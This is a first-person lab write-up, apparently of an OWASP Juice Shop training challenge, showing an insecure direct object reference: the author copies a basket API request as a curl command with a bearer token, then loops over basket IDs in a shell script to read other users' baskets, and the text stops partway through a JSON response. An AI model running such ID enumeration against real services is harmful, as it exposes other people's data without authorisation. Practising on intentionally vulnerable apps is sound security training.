I navigated to the main ui of juice shop and added a few items to my basket. 

I then navigated to the basket ui to look at my basket items. 

I checked the browser developer tool and found the request to the basket api. 

```
curl 'https://juice.8-thousander.me/rest/basket/6' \
  -H 'authority: juice.8-thousander.me' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-HK,en;q=0.9,zh-HK;q=0.8,zh;q=0.7,en-GB;q=0.6,en-US;q=0.5' \
  -H 'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0b3dhaWxhbTNAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjgxOWI0YzBkY2VjMWVjMWVhZWVlYTA0OGE4N2Y5ZjViIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMy0wMy0xOCAxMzowMDo0MC4yNDMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMy0wMy0xOCAxMzowMDo0MC4yNDMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjc5MTQ0NDQ0LCJleHAiOjE2NzkxNjI0NDR9.Bo1RIzjY8LCSVyRzKJ0zf5jVVU0UC1f_7mu0P7-xTk2KpyvJhz_UJuXT1bX5bSsPGj-VfdFQuJwx0EOnxOq_60RdeRjQp3N7Ne_iZX6laISfnIUtITc5s61Qohagxu9EQCMeclBuIw1NebN1x4JGiINm4KxzgZ13mwb2jPpIfiA' \
  -H 'cookie: cookieconsent_status=dismiss; language=en; welcomebanner_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0b3dhaWxhbTNAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjgxOWI0YzBkY2VjMWVjMWVhZWVlYTA0OGE4N2Y5ZjViIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMy0wMy0xOCAxMzowMDo0MC4yNDMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMy0wMy0xOCAxMzowMDo0MC4yNDMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjc5MTQ0NDQ0LCJleHAiOjE2NzkxNjI0NDR9.Bo1RIzjY8LCSVyRzKJ0zf5jVVU0UC1f_7mu0P7-xTk2KpyvJhz_UJuXT1bX5bSsPGj-VfdFQuJwx0EOnxOq_60RdeRjQp3N7Ne_iZX6laISfnIUtITc5s61Qohagxu9EQCMeclBuIw1NebN1x4JGiINm4KxzgZ13mwb2jPpIfiA; continueCode=lLrP7weLvQboX2p1gO354xyjdRjT9iK8f2edNl8K9mnRzD6qMaWVBJkEZYoO' \
  -H 'dnt: 1' \
  -H 'if-none-match: W/"56e-VPngdx1uZM6GmapwfFeh1CwkLKA"' \
  -H 'referer: https://juice.8-thousander.me/' \
  -H 'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36' \
  --compressed
```

The api used a simple integer as identifier, I wonder if i could view other user's basket by changing the identifier. 

I enumerated the first 10 identifier.
```
#!/bin/sh

for i in $(seq 1 10); do
    curl "https://juice.8-thousander.me/rest/basket/${i}" \
        -H 'authority: juice.8-thousander.me' \
        -H 'accept: application/json, text/plain, */*' \
        -H 'accept-language: en-HK,en;q=0.9,zh-HK;q=0.8,zh;q=0.7,en-GB;q=0.6,en-US;q=0.5' \
        -H 'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0b3dhaWxhbTNAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjgxOWI0YzBkY2VjMWVjMWVhZWVlYTA0OGE4N2Y5ZjViIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMy0wMy0xOCAxMzowMDo0MC4yNDMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMy0wMy0xOCAxMzowMDo0MC4yNDMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjc5MTQ0NDQ0LCJleHAiOjE2NzkxNjI0NDR9.Bo1RIzjY8LCSVyRzKJ0zf5jVVU0UC1f_7mu0P7-xTk2KpyvJhz_UJuXT1bX5bSsPGj-VfdFQuJwx0EOnxOq_60RdeRjQp3N7Ne_iZX6laISfnIUtITc5s61Qohagxu9EQCMeclBuIw1NebN1x4JGiINm4KxzgZ13mwb2jPpIfiA' \
        -H 'cookie: cookieconsent_status=dismiss; language=en; welcomebanner_status=dismiss; continueCode=9vXkzlbV2npoK65x83q9eOwgQ1AJ1Tjiwj0BJPkLXMyEYrDjZmvRN4W7aDBO; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0b3dhaWxhbTNAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjgxOWI0YzBkY2VjMWVjMWVhZWVlYTA0OGE4N2Y5ZjViIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMy0wMy0xOCAxMzowMDo0MC4yNDMgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMy0wMy0xOCAxMzowMDo0MC4yNDMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjc5MTQ0NDQ0LCJleHAiOjE2NzkxNjI0NDR9.Bo1RIzjY8LCSVyRzKJ0zf5jVVU0UC1f_7mu0P7-xTk2KpyvJhz_UJuXT1bX5bSsPGj-VfdFQuJwx0EOnxOq_60RdeRjQp3N7Ne_iZX6laISfnIUtITc5s61Qohagxu9EQCMeclBuIw1NebN1x4JGiINm4KxzgZ13mwb2jPpIfiA' \
        -H 'dnt: 1' \
        -H 'if-none-match: W/"56e-VPngdx1uZM6GmapwfFeh1CwkLKA"' \
        -H 'referer: https://juice.8-thousander.me/' \
        -H 'sec-ch-ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
        -H 'sec-ch-ua-mobile: ?0' \
        -H 'sec-ch-ua-platform: "Windows"' \
        -H 'sec-fetch-dest: empty' \
        -H 'sec-fetch-mode: cors' \
        -H 'sec-fetch-site: same-origin' \
        -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36' \
        --compressed --silent --fail | jq -re '.data | select( .id != null )'
done
```

And found 1, 2, 3, 4, 5 to be available for viewing. 

```
{
  "id": 1,
  "coupon": null,
  "UserId": 1,
  "createdAt": "2023-03-18T12:42:59.571Z",
  "updatedAt": "2023-03-18T12:42:59.571Z",
  "Products": [
    {
      "id": 1,
      "name": "Apple Juice (1000ml)",
      "description": "The all-time classic.",
```
